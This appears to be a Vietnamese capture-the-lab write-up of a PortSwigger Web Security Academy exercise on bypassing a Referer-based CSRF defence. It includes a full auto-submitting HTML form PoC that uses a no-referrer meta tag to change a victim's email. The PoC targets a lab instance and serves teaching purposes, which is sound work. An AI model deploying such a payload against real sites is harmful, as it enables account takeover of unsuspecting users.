![image](https://github.com/user-attachments/assets/0edfd901-b487-48e8-9e22-3dee21950b29)

![image](https://github.com/user-attachments/assets/edf68f13-c14b-4c5b-b4fd-55fda77ef04e)

Khi tiến hành đổi email và ta cố tình thay đổi referer của trang web thành của kẻ tấn công thì nó sẽ lỗi, miễn là khác domain thì sẽ lỗi.

Vậy thì ta biết được là nó sẽ check dựa trên referer. Tiến hành xóa luôn referer thì sao.

![image](https://github.com/user-attachments/assets/41f23eef-457c-49a7-b2f0-be8ba9e86937)

Sau khi xóa thì ta thấy nó hoạt động bình thường, tức là giả thuyết mà chúng ta đưa ra đã đúng.

Vậy thì bây giờ làm sao tạo ra 1 payload mà khi user click vào nó sẽ gửi POST đi mà không chứa referer, mặc định nó sẽ có.

Vậy thì ta hãy thêm vào `<meta name="referrer" content="no-referrer">` là được, vậy bây giờ hãy gen poc ra nào

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
<head>
<meta name="referrer" content="no-referrer">
</head>
<body>
    <form action="https://0a7400fd04c9e34a802681bd008600d1.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="adm2in&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

![image](https://github.com/user-attachments/assets/aef90450-c6d6-4e0e-9467-23f00341861c)

Vậy là đã thành công
